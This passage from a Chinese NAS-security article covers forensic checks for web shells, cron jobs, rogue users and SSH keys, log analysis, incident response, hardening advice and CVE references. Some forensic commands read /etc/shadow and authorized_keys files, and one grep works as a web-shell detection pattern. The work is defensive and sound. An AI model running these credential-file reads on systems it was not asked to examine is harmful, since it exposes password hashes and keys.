ps aux | grep -v "^\[" | awk '{if($3>5.0 || $4>5.0) print $0}'

# 检查 WebShell（QNAP 常用路径）
find /share/Web/ -name "*.php" -newer /etc/config/uLinux.conf

# 检查近期修改的文件（Synology）
find / -mtime -3 -type f -name "*.sh" 2>/dev/null

# 检查计划任务（所有平台）
crontab -l
cat /etc/crontab
ls -la /etc/cron.d/
```

#### 3. 用户与后门排查
```
# 检查可疑用户账号
cat /etc/passwd | grep "/home\|/sh$"
cat /etc/shadow | grep -v ":\*:\|:!\|:\$6\$"

# 检查 SSH 授权密钥
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys

# 检查新增的管理员用户（QNAP）
cat /etc/config/uLinux.conf | grep "User\|Admin"
```

#### 4. 日志取证
```
# QNAP 系统日志
cat /var/log/messages | grep -i "error\|fail\|attack\|login"

# Synology 登录日志
cat /var/log/auth.log | grep -i "Accepted\|Failed"

# Web 服务访问日志分析（通用）
cat /var/log/apache2/access.log | grep -i "POST\|cmd\|exec\|system\|eval"

# 攻击 IP 提取
cat /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
```

### 应急响应流程

```
1. 立即断网 → 2. 保留现场 → 3. 提取日志 → 4. 备份被加密数据 → 
5. 重置管理员密码 → 6. 更新固件到最新版本 → 7. 检查后门残留 → 
8. 修改所有用户密码 → 9. 重新接入网络 → 10. 持续监控
```

### 防守加固建议

#### 网络层加固
- **绝不将 NAS 管理端口直接暴露在公网**
- 使用 VPN（WireGuard/OpenVPN）进行远程访问
- 配置防火墙规则限制管理端口的源 IP 范围
- 启用 NAS 的自动黑名单功能（多次登录失败后封禁 IP）
- 部署 IDS/IPS 对 NAS 流量进行监控

#### 认证强化
- 启用多因素认证（MFA/2FA）
- 禁用默认 admin 账号，创建独立的管理员账号
- 使用强密码策略（16位以上、大小写数字特殊字符混合）
- 限制 SSH 仅允许密钥登录
- 定期审计用户账号和权限

#### 系统加固
- 启用自动安全更新，并在非工作时间段安装
- 禁用不需要的服务和功能包（Photo Station、CloudBackup 等）
- 关闭不需要的端口和服务
- 定期备份关键配置和数据
- 实施应用白名单机制

#### 监控与检测
- 部署 SIEM 或日志分析系统集中收集 NAS 日志
- 配置异常登录告警
- 定期运行安全扫描（使用 Nuclei 等工具）
- 订阅厂商的安全公告邮件列表
- 定期进行安全审计和渗透测试

### 厂商安全公告订阅

| 厂商 | 安全公告页面 |
|------|-------------|
| QNAP | https://www.qnap.com/en/security-advisory |
| Synology | https://www.synology.com/en-us/security/advisory |
| Western Digital | https://www.westerndigital.com/support/product-security |

---

## 0x07 参考资料

1. NVD - CVE-2024-21899: https://nvd.nist.gov/vuln/detail/CVE-2024-21899
2. NVD - CVE-2023-50358: https://nvd.nist.gov/vuln/detail/CVE-2023-50358
3. NVD - CVE-2022-46169: https://nvd.nist.gov/vuln/detail/CVE-2022-46169
4. NVD - CVE-2022-27610: https://nvd.nist.gov/vuln/detail/CVE-2022-27610
5. NVD - CVE-2024-10443: https://nvd.nist.gov/vuln/detail/CVE-2024-10443
6. NVD - CVE-2023-28831: https://nvd.nist.gov/vuln/detail/CVE-2023-28831
7. NVD - CVE-2022-22687: https://nvd.nist.gov/vuln/detail/CVE-2022-22687
8. NVD - CVE-2024-23641: https://nvd.nist.gov/vuln/detail/CVE-2024-23641
9. NVD - CVE-2022-23124: https://nvd.nist.gov/vuln/detail/CVE-2022-23124
10. NVD - CVE-2021-36205: https://nvd.nist.gov/vuln/detail/CVE-2021-36205
11. QNAP 安全公告: https://www.qnap.com/en/security-advisory
12. Synology 安全公告: https://www.synology.com/en-us/security/advisory
13. Western Digital 产品安全: https://www.westerndigital.com/support/product-security
14. Shodan NAS 暴露搜索: https://www.shodan.io/search?query=NAS
15. DeadBolt 勒索软件分析: https://www.bleepingcomputer.com/news/security/deadbolt-ransomware-encrypts-qnap-nas-devices-demands-50-bitcoin-ransom/
16. OWASP NAS 安全指南: https://owasp.org/www-project-nas-security/